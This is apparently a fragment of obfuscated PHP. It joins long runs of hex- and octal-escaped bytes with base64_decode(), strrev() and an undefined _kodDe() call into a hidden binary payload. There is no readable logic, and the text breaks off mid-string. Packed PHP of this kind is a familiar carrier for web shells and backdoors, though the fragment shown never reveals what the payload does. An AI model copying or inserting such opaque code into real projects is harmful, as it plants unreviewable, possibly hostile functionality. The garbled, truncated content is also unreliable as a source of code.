\x35\xe0\xef\xa0\x6b\x23\x63\xa6\xfd\x9\x42\x90\xa1\xb1\x39\x75\x73\x35\x82"."\x2b\x1a\xe6\xf1\xd4\xf6\x64\xb2\x4b\x8f\xb4\x91\x1d\xb7\x33\xac\x77\x84\x92\x2d\xed\xd0\xba\x63\xc\x62\xd3\x51\x42\x66\x45\x93\x98\xb8\xc6\x4f\xd6\x8\xc5\xa6\x4e\x32\x38\x99\xd8\x65\x8d\x9a\x45\xf2\xe1\xe6\xf1\x46\x6d"."\xd8\x4a\xf7\x5b\x63\x1\xcc\xa2\x85\x13\x84\x58\x60\x61\x3a\xbf\x5\xc7\x1f\x37\xf2\x83\x74\x18\xfd\xe3\x8e\x69\x7b\xc9\x4d\x33\xd9\x9f\x3\x3\x7c\x41\x6\xfa\xcd\x1\xab\x8\xa3\xb1\x47\x6\xdd\xc0\x8f\x9a\xf9\x41\x67"."\10\333\116\204\343\253\302\161\75\21\153\113\256\16\305\141\73\317\23\314\31\303\336\320\257\147\375\161\63\115\200\230\162\260\236\121\220\320\137\343\247\13\206\176\34\163\351\42\302\274\150\144\5\205\135"."\253\337\46\205\374\152\51\154\73\232\311\145\350\360\34\221\303\200\115\366\372\25\320\241\40\33\163\123\257\75\253\246\67\75\273\326\117\376\235\125\333\323\333\32\230\325\267\54\230\221\165\202\365\201\172"."\255\241\156\276\326\105\230\217\214\221\325\140\320\145\45\352\264\330\112\67\130\44\206\347\255\274\131\161\141\21\104\262\154\323\337\156\32\204\356\222\211\160\315\213\17\277\305\343\37\2\135\272\375\51\264".strrev('@ƒİŠ5§^¬ )ï$‚Û)k4<ºv^Sâş³*O(Aº¬{dáêHœ;½>1</3Ä')."\55\103\146\152\170\212\74\22\202\321\130\234\56\341\324\365\360\237\76\300\346\76\376\243\353\55\321\160\50\256\3\223\252\147\354\66\145\147\244\121\101\156\165\253\177\75\101\264\16\323\61\344\0\310\347"."\42\71\262\244\345\100\164\367\66\206\243\354\220\210\117\126\320\352\114\132\354\163\44\332\156\146\6\207\240\337\31\332\134\312\312\132\105\43\113\267\2\144\115\7\63\100\225\13\331\22\131\6\101\332\160".base64_decode('cqiU64eNi4Bs0HQk12iPE9Yqh3su2bidSKtrZ4VYUKeo2xso5AdrT4W29IZ5dTQBZhVGRtjnkg==')."\131\76\364\100\312\42\353\274\303\30\66\33\351\130\200\270\55\146\251\30\121\350\347\142\272\345\65\171\311\4\235\255\154\40\107\32\141\155\266\130\142\223\346\7\224\305\356\55\117\63\213\105\253\170\12"."\x94\x60\x61\x8d\xed\x9b\x74\xba\xa0\x71\x47\x30\x16\x36\xa1\x8\x18\x1e\xb2\x4\x23\x62\x21\x6e\x36\x6\x61\xdc\x33\x1a\xda\x80\x8a\xa4\x9\x43\x16\xb0\x1d\x32\x9\x64\x80\x46\x3a\x5d\x29\x99\x50\x1e\x68\x60\x33\xa2\x2d"."\313\100\266\40\230\230\103\376\227\74\100\332\312\31\270\243\122\102\44\76\113\43\266\210\261\155\322\114\363\175\322\225\304\27\70\117\232\205\237\54\72\26\315\54\272\112\22\44\35\262\240\323\4\53\140"."\300\45\61\162\204\101\332\314\232\210\140\103\46\262\32\165\120\214\314\214\100\277\1\261\16\310\371\200\244\112\266\55\143\307\111\115\312\30\140\174\65\75\120\311\4\312\35\1\136\311\140\226\314\152\214".strrev(''."\r".'$ÄKPõZ…b‘†I:²1ç$™Ö%½Q£ºÛL²ˆÒ)rš‘ÆQ‡Nc%$1™š*ï(-')."\xc\x9c\xca\x82\xf0\x94\x91\x6\x40\x21\xd2\x89\xa0\xe4\x95\xc8\x66\x5d\xb0\xf2\x84\xd2\x2\xb1\xf2\xcb\xd3\x5a\x59\x56\x5a\xb2\x12\x80\x3b\x92\xfd\xf0\x70\x14\x84\x27\xc8\x6d\xf4\xe7\x8\x5d\xf1\x8b\x3e\x75\x75\x3\x2f"."\200\130\201\234\156\363\170\233\125\104\66\56\63\230\137\45\146\176\165\142\256\277\275\43\324\342\117\264\207\32\346\315\347\251\153\163\351\336\144\173\306\356\75\103\304\241\73\243\366\134\275\150\222\65\215"."\xb8\xd0\x50\x57\x8f\x2b\x8e\xf0\x25\x86\xec\xf9\x5a\x7f\xce\x4f\x5b\xa1\x2c\x65\xa0\xae\xae\xe\xdb\x9a\x3d\x5f\x1b\x22\xa4\x44\xd0\xef\x34\x1b\x2d\x1e\x5e\x4a\xa9\x61\x53\x25\xe7\xb6\x7f\x34\x83\x34\xef\x54\xc1\x8e\x9f".base64_decode('Wg58u8R2N91I0eZ0Utkp2SqkCAKmSZUMcsk81cgOWgTvhnJqYlrgL4+bnOWCDw0ZAk4Uerg4CA==')."\x43\x37\xae\x56\xa2\x60\x26\x7d\x40\xfa\xed\xe6\xb1\xb5\x64\x65\x40\x73\xd6\x3d\x2\xd0\x96\xfd\x28\xd0\x9d\x8d\x50\x6d\x9c\xb6\x99\xfc\x67\x1a\x74\xa3\x44\xd6\x6d\x31\xb3\x51\x81\xfe\x32\x6c\x9\x69\x66\x2c\x1\x9f\x1c"."\313\145\345\261\12\100\3\320\124\207\66\246\223\34\35\162\164\65\247\135\320\1\234\205\216\126\317\232\340\233\77\117\133\262\214\174\121\33\241\102\32\53\337\124\135\37\250\253\326\360\260\331\124\335\235"."\154\43\174\372\262\245\323\226\264\130\271\2\45\53\35\245\254\223\241\343\345\230\273\24\306\270\204\362\100\30\351\362\200\43\234\64\140\327\131\22\124\313\55\11\116\325\52\14\205\62\146\153\364\256\150"."\50\331\26\213\167\0\216\27\12\22\255\12\251\112\253\315\57\51\122\311\366\233\224\117\206\125\140\244\262\36\24\125\141\261\246\42\46\256\251\204\211\153\74\230\270\246\34\23\327\124\302\263\21\100\110".base64_decode('I2dstPJkvZKNNhdIAVok2yOdK/WOWGs4qkc6CT+XLE/v7moNIRlU05tjyXZXajfh6FaFohFv8Q==')."\xf0\x9a\x48\x22\x99\xa8\x98\x45\xd2\xba\xc3\x9e\x9c\xd6\x66\xbd\x2b\x1e\x6e\x8b\xac\x11\xd1\xb6\x48\x38\xda\x9a\xd0\x5b\x42\x2d\xed\xb2\x4c\x67\xa8\x3\x22\x84\x57\x32\xb3\x69\x3b\xe8\x2e\xaf\x13\xd6\x34\x21\x24\x69\x3a"."\40\34\304\134\302\53\35\305\62\272\244\304\344\230\143\302\164\300\160\251\54\222\215\104\107\122\125\22\214\46\236\351\163\270\325\222\43\32\200\35\317\47\65\374\247\126\13\45\64\247\240\213\115\265\177".base64_decode('XATZMDCuIzNJ2BHoiAb8cllXdFqmWTkVVU4IDTiCJfXEyV4i88hUhJj0k6AEmxr4TIbsTEUnhA==')."\xdd\x19\x90\x92\x47\x3d\xd6\x15\x8e\x87\xa8\xdc\x52\x5f\x1d\x8f\x75\xae\x80\xa\xa3\x43\x26\x76\x20\x2\xf3\x50\x83\xc7\x54\x10\x5f\x3a\x72\x83\x37\xb2\x19\x3\xe5\x58\x12\xfa\xeb\x2d\x84\x29\x39\x9a\x23\xf3\x9f\x47\x80"."\367\123\356\6\131\136\14\14\220\25\215\234\211\125\22\355\367\133\26\264\231\245\47\62\150\336\106\234\30\303\375\171\266\330\277\0\123\143\53\303\235\72\42\22\217\51\310\307\23\302\361\170\54\16\303".base64_decode('dqxhFHDxzHg4EU7iDr+hlEGgBAOzAWlNwtPB54Nn9o7Orunxzw70kUDtrOU8CrHegCuKrHapKA==')."\152\123\66\260\306\136\126\333\330\33\354\15\326\54\153\354\11\371\67\32\376\215\165\376\105\376\76\302\240\327\316\206\204\276\115\15\276\271\133\150\1\122\160\331\364\76\362\323\324\273\154\106\257\177\346".strrev('şiº™3€+0èW’(«C‘.×g¦®‘±¸'."\0".'ÎH©TøeÚ¬ßhïz`oJ}œn«íéï-ÖW')."\114\47\363\146\16\312\32\75\376\336\331\175\313\224\172\112\222\367\133\204\224\22\216\157\110\224\13\371\317\240\43\23\125\351\62\7\234\50\345\123\162\67\244\330\337\157\210\323\337\140\136\36\253\234\242"."\x10\x7a\x8e\x10\x8c\x94\x4\x77\xd3\xc\xfe\xbb\x5\x27\x72\xd0\x1c\x43\x4a\x90\x1f\xc8\x20\x37\x55\xca\x67\x36\xe0\xf9\x26\x6f\x6e\x80\x80\xe5\x8\x2c\x36\x9d\x51\x13\xd1\x83\xa4\xbb\xe2\x4\x39\x70\x13\x20\x59\x4a\x2c".base64_decode('q2waTJQlcFQgU6ag06PeqIiRPQXm6QgobaeMgplQRqjryVBzNCzOrUB4Mc6IYLO4GiFDkwQUqQ==')."\x80\x22\xa6\x62\x62\x23\x58\xdf\xf6\x86\xac\xc6\x96\x3f\x3f\x63\x35\xb2\x5b\x22\xbb\x54\xa0\xc7\x25\x8d\xcc\x38\x81\xad\x46\xd8\x37\xad\x69\xa9\xc6\x41\xe\xf5\x74\x75\x2\xa\xe2\x18\x44\xe5\x9c\xa6\x5c\xe8\x94\xe\x41"."\237\12\162\206\154\162\14\301\203\100\260\246\267\267\324\143\246\373\172\10\342\33\376\201\276\115\163\266\324\242\54\45\330\113\376\140\44\124\341\276\102\67\34\4\211\240\176\372\212\160\62\100\173\44\44"."\xd4\xae\x88\xc8\xe6\x51\xab\x28\xce\x15\x5\xd7\xc1\xde\xb1\x1c\x23\xeb\x6a\x22\x49\x53\x90\x30\x21\x2b\x5\x82\x5d\x3e\xef\x51\x49\xaf\x28\xc7\xa1\x5c\xf9\x30\xf2\xd9\x29\x4\xa9\x82\x21\x56\xee\x1c\x68\x8d\x84\xe9\x4".base64_decode('RAmfkqmTuEqsxTUPi62SBVkdoM4a+bO6PdyJpDyphJu0llAijDFgu6aFO1vhOoX/C0woFFs8DQ==')."\67\224\74\131\314\55\312\276\312\245\364\11\46\203\160\335\115\331\246\121\114\15\265\225\262\131\107\110\202\262\231\141\350\54\254\124\270\52\363\303\307\146\127\252\112\216\101\50\30\235\5\362\351\252\131".base64_decode('lQpG8nkr3a8iutzRV4QI75TUavBaR4t0as2xWDQc6tQo8wB7HeFMEuGuENkoqYg1kQzDTVMGJg==')."\63\322\352\307\366\327\370\121\260\42\2\126\201\37\144\114\107\317\132\110\272\334\42\31\172\32\364\121\301\210\217\62\62\76\322\153\37\225\245\370\344\131\333\47\157\113\174\43\31\163\224\5\304\71\330"."\x7\xc7\x63\x9f\x94\x2\x41\x30\xd2\xea\xcb\xd8\xad\xec\x98\xcf\x3e\xc0\xb2\xb0\xb\xce\x10\x95\x78\x67\x8d\x71\x1f\xef\x4e\xd4\x1c\x31\xb3\x3e\x94\xf\xf9\xb0\x8f\x3e\x94\x8a\xf9\x98\x34\xab\x15\xba\xd5\x4d\x16\x33\x74"."\213\5\11\315\36\362\121\244\245\153\306\47\357\157\174\326\150\336\54\262\42\0\66\51\41\360\111\351\201\157\260\150\225\12\135\370\115\45\306\273\5\11\262\317\42\41\156\131\216\17\5\155\76\125\342"."\6\275\10\341\332\254\10\316\312\243\141\360\367\166\2\360\213\146\225\103\351\43\46\253\174\76\334\302\306\115\274\105\20\264\156\301\75\326\125\206\11\375\4\253\113\1\56\103\312\232\247\3\150\63\340"."\246\220\67\253\206\21\353\160\147\103\64\226\367\72\362\222\116\62\326\136\271\217\367\372\216\176\224\234\336\22\312\347\34\143\20\277\105\11\244\70\333\125\50\312\303\161\63\65\236\222\202\244\126\105\74"._kodDe('MHzT1veDofdBGdmYvVKu9x98wfAmeI8b1sJUGKNoLLArBjZ5vxIDsME5KWt3WnBbkPJHcTH7iFI=').base64_decode('3ueO0eUUYCScXYEnhMwyGm5LaqfFCL3KWDqvo9PCGvvHymuuthFchMqzFkXcyKd5yjqyn6xrqg==')."\xc2\x8f\x54\xb9\xaa\x4b\xc4\x70\x77\xc2\x87\x51\xad\x1c\xd5\x28\xb8\x55\x20\x50\x4\x60\xc3\x97\x7b\x20\x26\xc5\xe4\x96\x5b\x2\x4e\xd3\xb0\xe1\x88\x47\x25\xbe\x10\x32\x31\x4d\x4e\xad\x8a\x89\xa\x81\x91\x9\xd8\x2f\xd7".base64_decode('d2lUriJECY1+wKfwRpSI+OV6UKJukHsw0rNRUxB1ZfLjmXwiQyUY3lRY2KwLXYZtjxIGBPa9WQ==')."\xb3\x66\x69\x92\x15\x90\x9c\x8\x5d\xed\x32\xc6\x91\x76\xaa\x30\xdf\x55\xa8\x94\x83\x7f\xde\x7\x77\xd5\xbe\x6c\x26\x3f\xac\xec\xd8\x52\xb8\x4a\x6\x47\xab\x2a\x43\x83\x96\x3c\x3\x83\x86\x94\x22\x12\x40\xb0\xc0\x61\x41"."\xc\x19\x45\x9\x6b\x24\x4b\x94\x36\x88\x31\xd8\xb4\x88\x8c\x2a\xc5\x6\x8c\x11\xc9\x25\xb9\xea\x28\xc4\xc5\x76\xc6\xb1\xf7\x6a\xd0\xdd\x28\x8f\xb6\xfa\xd8\x6f\x3b\xe9\xbc\xaf\x44\x7a\xc9\xe8\x71\x94\xc0\x82\xfc\xb0\x8e"."\46\55\111\332\171\240\213\355\313\144\175\223\54\276\227\333\123\20\2\72\61\124\44\247\156\176\374\163\231\264\200\0\375\30\56\237\122\256\25\156\64\150\170\25\241\43\52\313\140\53\35\217\225\344\61".strrev('a=~«s°DtÒ®€bĞvK%	ÈRØà„n ‡™Ñ€ÂH5¤Äáy;Å]G&“(').base64_decode('eEDzsoVEWZ5aWoou6RYjtyRxISgWuZxCuaIHZYfoLOrl/aBzUTneVrQEEy+4CW+hFnZeFjorHg==')."\xe\x40\x81\x87\x8b\x6b\x29\x4b\x52\xea\x78\xf9\x17\x4f\xaa\x27\x4a\x79\x9a\xa\x5b\x1d\x74\x93\xdd\x43\x15\xf9\x66\x19\x20\xa7\x1f\x50\x3d\xf2\xd5\x29\xac\x9d\xa4\x70\x9b\xf8\x5d\x20\x6c\xae\x5b\x3c\xf3\xeb\x58\x16\x39".base64_decode('UhcDRfJF2RGFugLtYboqCWPAVBkSV2aoUJDdFu3bpIqyg7g5MmwzUTBw49D8mqcFo1BQvynYSQ==')."\x44\x78\x76\xe0\x2a\x89\x4\xd\xae\x7a\xf9\xa8\xe5\x90\x44\x5f\x79\x46\x54\xf0\xe2\x94\x78\x85\xd3\x19\x87\xa6\xd0\x75\x6c\xe1\x45\x99\x2c\x28\xb7\x77\x6f\x65\x19\x57\xf7\x1b\xb6\x6d\x96\xa1\x8d\x3c\xe8\xf8\x66\xb8\x4a"."\x56\x62\x6e\x2\xb3\x18\x3f\x12\x90\xbc\x58\x65\xa5\xad\x94\x55\xc0\xa3\x5f\x51\x51\xb0\x1c\x31\x95\x44\x7a\x67\x59\x90\x39\x4a\x94\x67\x2b\x59\xb2\x51\xa5\x94\x98\xa\xd6\x23\xb2\x32\xd3\x8c\x83\x97\x50\x60\x65\xa1\x2e"."\23\76\360\305\37\240\7\236\200\272\213\204\212\105\104\175\76\114\172\237\116\22\325\44\112\234\23\270\156\53\355\265\274\361\360\210\124\123\344\115\321\17\7\70\341\240\227\266\261\274\130\57\62\134\136"."\x54\x15\xb7\x56\x6e\x28\x21\xf5\x18\xdc\xb1\xca\xc5\x43\xd9\x6c\xab\x81\x7d\xf5\xc6\xa7\xac\xc2\x9\x86\x5a\x49\x4d\x99\xb2\x5a\x1b\x3b\x7b\xa3\xd2\x46\xa5\x34\x71\xea\x9a\xfa\x24\xe1\x55\x1e\x70\x13\xf9\xa9\xf9\xad\x29".base64_decode('yKOcxspxwjq0DGXyJsqnBjJFuxK1+3/M2JdDnq6QqdCF5imCeaouPWKqRxwhl5akSvAcZZwScA==').base64_decode('K0pEd1wMX5y1rywnF4aQ5cvhQTe7SCxgT4Gz3nJCTYfRxDGxR6uVaBadS7VRyWB+SHnRuGQ21Q==')."\162\4\167\151\306\124\175\305\154\321\312\271\77\376\316\273\157\376\220\207\177\364\257\7\36\333\165\21\364\45\127\52\156\104\301\34\360\247\344\337\217\155\376\44\17\113\325\371\363\326\364\130\137\170\342"."\x84\xb6\xf7\x9f\xd9\xfe\xc1\xb4\xea\x7b\x3f\x11\x3e\x32\x13\x3f\x35\x7c\xf7\x59\x87\x24\x1e\x6a\xdf\x59\xf3\xd2\x95\x5f\xcf\xde\xff\x97\xfe\xfb\x16\xaf\xdc\xbd\xf0\xc1\xef\xff\xe1\xba\x13\x22\xcf\x5\xdb\x7e\xff\xf8\x78"."\373\145\337\12\164\175\326\177\306\115\237\70\343\206\35\137\272\41\174\366\314\3\217\176\73\360\336\147\257\373\343\375\157\4\152\157\331\366\247\353\26\331\223\117\55\32\174\304\76\351\326\353\267\274\365".base64_decode('wj+u//e6r719yA1f3vXPZ6YfPHTuXZ964edf/PS2F6pqjrfPuPL0ra++u/kbO7607+inH18TuA==')."\373\77\213\353\267\365\135\364\104\266\265\327\136\170\156\340\33\247\136\274\362\343\347\174\355\23\177\72\356\215\151\33\232\237\64\366\34\154\376\324\161\237\353\270\73\270\367\335\365\177\374\361\265\377\275"."\372\350\115\107\266\215\255\173\261\161\327\55\327\135\366\316\326\343\276\231\216\317\270\264\61\170\133\347\127\376\272\374\337\205\216\113\137\330\177\103\237\371\361\133\176\365\310\304\151\163\207\356\351\311\76".base64_decode('9JusddU31u/at+mZjuuvKVz706Pq735zxncfa1+w8hN9s/Ppdz+37LFnF1ywJ/PMO58b/9PWkw==')."\236\131\71\343\246\235\265\77\175\370\332\201\353\157\75\170\331\3\347\337\174\277\275\145\362\354\322\175\107\64\174\343\365\213\342\157\152\165\333\3\366\246\317\257\237\376\320\23\341\115\203\237\231\70\354"."\x9a\x66\x23\x65\x5f\xfe\xfb\x85\xff\x38\xfc\x9e\x17\x6f\x7c\x64\x57\xf5\xcd\xf7\x6c\xfd\xc4\xab\xef\xcc\x7a\x77\xee\xfc\xbd\xa7\x3c\x3b\x7b\xfa\xed\x3b\x66\xaf\xd9\xef\xbb\x76\xff\xe7\xbf\x74\xd5\x4b\xdb\xdb\xee\x7b\xec".strrev('÷Ÿç£EØğ™ùĞì»ò¼ŒGÅõVú?óşÙ)ëo¶¼w~Wä~ŸŸD7æ[=âwÅ}-6ç»úÜï‡').base64_decode('uz+c1/LaqfO3nVh3+lf/T6Fpa/6aka/+13mllgu+eNv2+vM/PTNwbu6waaMXbf3U+/885MpjHg==')."\xfb\xcd\xd2\xbe\xb\x73\x6f\x9c\x63\xb4\x9f\xb8\xea\xf2\x5f\xef\xfe\xf6\xeb\xfd\xdf\x39\xf2\xb6\xed\xef\x5e\xf0\xfa\xbb\x93\x3f\x31\x37\xc4\x5f\xd8\x50\x35\xf6\x44\xf6\xf9\x43\xcf\x2a\xbd\x71\xc6\xd6\xd9\x7b\x5e\xfd\xf6"."\216\272\147\142\321\333\316\216\16\5\57\377\306\255\346\264\73\76\265\255\373\221\357\105\157\174\350\27\217\377\56\77\362\164\323\355\117\317\73\176\301\262\316\335\332\341\275\177\76\161\311\55\65\347\166"."\374\346\313\325\265\207\155\74\145\362\376\165\115\223\125\221\313\137\153\77\155\173\152\346\276\335\153\217\272\346\345\123\7\252\333\73\27\370\237\165\16\36\366\311\57\276\366\352\35\7\317\72\153\371\272".base64_decode('J1/6e+TJO5f3PHpW9M25vzr2vqPXHXPj9l8fOO/PP3nvrMf3bt+y+pxpz/a2X1k77dRDD7nysw==').base64_decode('1x57d3RovP3GgZ/N1rW2P5xy1DkZM1215dBnF/z6hMOG6kb+8qnHZ968qOqx73/s058L/PaNJw==').base64_decode('r/j8vUfaT55wzrlX/73rz2sfO2Tpabc/dfnJK792vv+bNTMGPnfoliUn3nBh+703n7fhqW3Gzw==')."\277\373\270\363\303\343\167\77\274\346\251\340\57\103\205\275\327\35\163\357\237\237\266\57\371\374\267\177\172\305\211\153\322\367\324\117\236\243\355\175\342\271\117\137\76\162\321\147\146\276\173\327\357\236\334"."\161\344\231\53\357\375\305\151\67\175\153\344\347\377\356\13\114\173\340\313\177\153\177\172\351\312\247\246\337\176\305\161\357\366\375\151\307\225\207\37\163\351\355\241\154\335\327\67\57\177\336\274\362\306\315".base64_decode('g7d+8v1bnzp40Q3Hnnb6EYfZ9298ZujbEwPf3/Ld+S9eNNL7+1Wb3hz56t0/PGXd0VbtxiW/eA==').base64_decode('v/mW7OOfbemru+Vf73wscOQRT97hT9wd/OzHOt5f+Oezb/77RSFj2/mtn7noC/f+aO1Xfr5j/w==')."\xde\x2b\x2e\xb0\x6b\xfd\xe3\xe6\xc7\x97\x1c\x57\xb7\xd7\x97\xbd\x6d\xde\x1b\x4f\x65\xf6\x34\x54\x65\x5a\x4f\xca\x5\x77\x7e\xee\xb9\x1f\xb7\x8d\x24\xf6\x9d\x76\xcc\xdb\x2b\xbf\x50\xfa\xd9\xc3\xf7\xb4\xa6\xce\x3f\xe4\xcd"."\x7b\x77\x1c\xf5\xcd\xe6\xd1\x4d\x5f\xf9\xc5\x6b\x87\xf7\xd4\xd5\x5c\xb1\xd7\xd7\x73\xe9\xd6\x2d\xb\x8f\xde\xfa\xc6\x96\xc3\x56\x26\xdf\xbb\xf2\xca\x37\xdf\x3a\xf3\x8e\x97\xf2\xab\xa\xf6\xf1\x37\xfd\xa5\x6d\xfb\xa2\xe0"."\x97\x4f\xe\xec\xc\x7c\x6a\xbb\xff\xf4\x99\x73\x5f\x38\xe3\xed\x7\x2f\xfe\xcc\xb1\xbe\x3f\x9e\xb5\xfb\xc2\x3f\x8e\xde\x57\x78\xf9\xd9\xf0\x8b\x85\xaa\x9e\x3\x37\xff\xac\x73\xdf\xd9\xdf\x3b\x58\xba\xbf\xf8\xf8\xcd\xdf".base64_decode('e+8rD97x5ec2XvDGq71Dy1fv2vv7t0afPfPOM19/bmPvOcfclbts+hf8t8Ra2u5848qeO8+Ycw==')."\124\355\374\125\343\375\247\64\174\357\230\337\36\322\170\110\252\346\230\177\34\125\367\345\227\236\276\163\370\360\367\377\260\363\7\267\375\343\37\245\256\347\142\53\136\55\324\137\277\342\241\247\166\267\276"."\146\155\30\177\52\372\333\211\335\377\265\77\173\367\47\157\77\351\213\367\274\262\143\321\313\323\336\14\374\160\125\164\373\121\47\36\21\377\325\257\317\51\216\277\372\322\226\371\137\35\133\375\33\373\365"."\xf7\x1e\x7b\xed\xe7\x2f\x3e\x7c\xc5\xa6\xd3\x7f\xb9\x35\x7f\xc5\xcf\x2f\x7d\x78\xda\xc9\x7d\x1f\xfc\xf5\x27\x13\x27\x7f\x65\xe4\xdf\x93\xc1\xe7\xad\xeb\xf5\x7f\x1f\x7c\x6f\x6f\x50\xef\x7b\x74\xcb\xfb\x1f\xfc\xed\xf7\x7b"."\2\147\376\347\337\257\334\264\372\252\353\377\363\336\153\177\373\306\167\136\376\367\346\263\56\171\371\345\343\146\376\363\307\47\377\164\313\155\155\173\257\255\13\236\65\377\342\35\367\34\171\304\117\376\171"."\337\211\133\253\256\71\345\236\33\142\47\374\44\352\134\30\132\373\352\63\33\176\175\147\340\213\332\15\73\76\376\273\73\317\155\276\343\262\267\116\354\274\315\377\207\303\37\234\134\24\235\373\227\370\71"."\341\123\253\103\77\273\277\153\327\223\113\12\143\65\247\155\217\216\36\33\72\272\224\372\353\251\177\173\351\347\57\376\346\7\357\177\147\175\355\217\23\371\300\243\37\20\376\271\364\325\75\273\223\53\267".base64_decode('feVan/+OwfHX2s89taV9493Hth0aq2s7c8bcK455fMvjF371wOePejt5Qc9lp50/rbXnzXe3Pg==')."\360\353\375\245\257\315\276\140\371\63\127\74\163\335\351\241\370\71\232\157\264\361\265\320\65\277\275\341\237\37\334\325\24\371\315\372\221\167\236\113\175\353\237\27\237\323\367\365\173\116\150\133\263\256\337"."\x37\x74\xe4\xd0\xb1\x5f\x2f\x3e\xb6\xf3\xf1\xeb\x3e\xf3\xd5\xc0\xd5\x67\xfe\xf8\x82\xc7\xcd\x39\xef\xbe\xfc\x9f\x45\xf7\x4d\x1c\xf6\xf5\xfb\x4f\xda\xac\x3f\x72\xf5\xaf\x27\xbb\x87\x8b\xce\x6b\xbf\xfc\xde\x49\xb7\x1c\x3c"."\xfa\xd6\x6b\xdf\xbf\xbd\x77\xf1\xb7\x8f\xfe\xfb\x69\xb5\xb\x17\x2f\x5b\xf5\x3f\xf9\x5b\x16\xff\x22\xb7\xf7\x1f\xbf\xbc\x70\x7c\xb8\xee\x85\x37\x16\xfc\xfe\x8a\x7c\xd3\xab\xbf\xfd\xb5\xb1\xed\x8b\xcb\x7e\x7e\xeb\x77\x7f"."\346\314\77\370\346\263\377\272\43\361\235\325\307\104\73\346\67\374\375\245\274\161\333\340\245\147\136\165\335\367\307\107\163\245\133\222\167\276\363\112\354\360\321\271\35\257\117\377\365\75\135\107\234\176\336"."\xcd\xbf\x4a\xcf\xbf\xf1\xcd\xe3\x6e\xdc\x92\x9e\x35\xb4\xf0\x2b\x9b\xb7\x4f\x1e\xbf\x71\x5c\xbb\xfd\xe5\xa3\x3b\x7f\x74\xd2\xdb\x73\x9f\x77\xbe\x76\xfb\xbe\x7b\x4f\xf4\x7d\xf7\x91\x27\x5e\xaf\xfe\xec\x3f\x96\xbe\x5f\xe8"."\x38\x7b\x7b\xf4\xed\xfe\xc5\xdf\xba\x6e\xeb\xdb\x3f\x7d\x66\xfa\xf\xef\xdc\xb9\xe8\xa2\xdb\xde\xcd\xbd\xfa\xe5\x43\xae\x7a\xe2\xa6\x83\x6f\xfc\x73\xb9\xb3\xe6\x93\x5b\x16\x3c\x93\xff\xc9\x4f\x6\xb7\xae\xd8\xf7\xc3\x4b"."\366\376\307\37\115\67\377\340\241\77\37\165\302\274\117\234\375\243\277\36\373\116\135\341\222\233\256\335\356\374\151\147\352\262\105\347\115\76\165\317\57\36\151\377\130\143\56\174\323\111\77\372\173\327\141".base64_decode('uctevevWZ6ovmblx1vcvGP/RO5P3nvjmfz/2xNq373hlcOGZv6+7+ecLv7g3l37xU2ed/J83Tw==')."\215\254\34\131\140\354\232\365\203\173\237\174\151\347\215\177\76\267\376\331\317\275\370\327\352\155\23\117\54\331\165\376\266\117\375\362\213\255\47\215\177\365\332\243\276\176\303\121\307\34\377\350\215\167\325"."\x1c\x3a\x7f\xb9\xfd\xab\x77\xff\xfb\xdd\x23\xb3\x4f\x4c\x9f\x91\x7d\x7b\xee\xb\x3\xdb\x1e\xb8\xfb\xcf\x9b\x17\x9e\x34\x78\xd8\xeb\x3f\xe9\xdf\x70\xe9\x25\xaf\xdc\xff\xb1\xa1\xf5\x7f\xaa\xf9\xcc\x8c\xa5\xd5\xcd\x91\xf4"."\xef\xd7\x8c\xcc\x37\x2f\xbf\xf5\xb3\x87\x9d\x77\xc7\xbd\xc6\x71\x4d\xdf\x7f\xfe\xea\xa5\x2f\xfd\x6c\xd7\x68\xe4\xe0\xe3\xff\x58\xfc\xcf\x3\x43\x9b\xfe\xb9\xf0\xd5\xe3\x97\xff\xd2\xf7\xe5\x37\xdf\xbc\x62\xf1\x71\x73\xfd"."\xc6\xf\x7e\xbb\x3b\xf6\xc5\xd2\xdc\x5\x43\x7d\xbb\x9c\xb\xff\x35\x7d\xd3\x13\x57\x5f\xf7\xce\xa5\x87\xbf\x3a\xfd\xaa\x97\xff\xb8\xe7\xb7\x2b\xbf\xf1\x9d\xe1\xd8\xf5\x7f\x8d\xdf\xf7\x99\xcf\x7f\x73\xfb\xbe\x2f\x5d\xfd"."\xd3\xde\x92\xe6\x5c\x75\xf8\xdd\x8f\xdc\xe3\xfb\xef\x8f\xbf\x7f\xef\x79\x67\xbd\xf1\x7b\xe3\xfa\xe6\x99\xc7\x9c\xb2\xb6\xfe\xad\xf3\xcd\xa5\xab\x8f\x35\x9e\x3b\xe1\xc1\xb1\x97\xff\x30\xd1\xb7\x72\x41\x75\xe2\xd8\xea\x7d"."\xef\x5d\xb5\x6c\xef\xf3\x13\xe3\x5f\xf8\x9f\x9e\x9d\x8b\xcf\xfd\x6e\xc7\xb7\x2f\xf8\x93\xff\x2f\x4f\x37\xfc\xea\x88\xe3\xb7\x5d\x37\x56\xd5\x77\xc1\x46\xe7\x6f\x7f\xb5\xae\xa\x3e\xf2\xc0\xff\x3c\xfd\xd9\xe7\xf5\xf\x5e"."\x79\xe5\xd5\x3d\xc1\xf\xde\x79\xfd\xc2\xd8\xd2\x87\xff\xb5\xef\x27\x13\x6f\xfd\xe7\x2f\x6f\x7e\xe7\x57\x81\x33\x37\x9f\xb4\xf3\x83\xd7\xf7\x7\xf7\x7c\xf0\x5e\xc7\xdb\xff\x78\xfa\xe4\x3d\x2f\x3d\xf4\xc8\xbf\xde\xb8\xe9"."\102\375\337\177\177\345\67\227\354\171\344\203\327\377\366\350\322\377\274\365\350\243\353\236\76\344\255\103\227\336\320\321\165\364\307\266\164\76\330\172\311\177\375\340\357\277\374\355\165\243\57\274\370\340\311"."\205\353\255\325\167\374\340\137\277\314\247\254\107\307\237\131\77\372\100\323\55\137\35\163\376\347\300\137\216\370\334\120\343\334\155\323\337\161\56\362\175\141\361\161\317\117\377\340\5\147\376\262\137\245\237"."\267\337\173\254\155\303\367\167\276\370\257\143\366\356\174\371\204\330\263\157\314\331\366\314\237\307\116\74\371\334\277\254\231\67\164\327\355\127\136\24\334\375\263\37\36\177\367\206\33\356\267\57\253\276\361"."\113\317\155\374\322\47\137\375\317\241\127\135\331\367\231\65\47\240\251\340\202\6\270\260\106\363\233\314\330\120\266\50\104\272\343\106\1\71\304\5\363\101\253\154\316\234\171\170\336\266\307\373\55\220\343"."\25\206\235\134\176\375\106\36\31\313\27\354\215\45\20\17\202\271\324\302\6\120\73\35\51\16\154\34\57\301\205\135\176\203\65\50\224\22\100\41\152\336\34\50\231\65\12\343\3\230\331\60\27\32\62"."\234\215\243\271\41\64\235\162\6\212\303\33\241\61\220\267\57\134\270\10\72\230\266\106\262\203\240\126\135\77\37\272\75\257\1\312\55\152\200\101\57\234\277\200\7\206\67\220\261\147\100\106\67\66\234"."\32\37\310\302\210\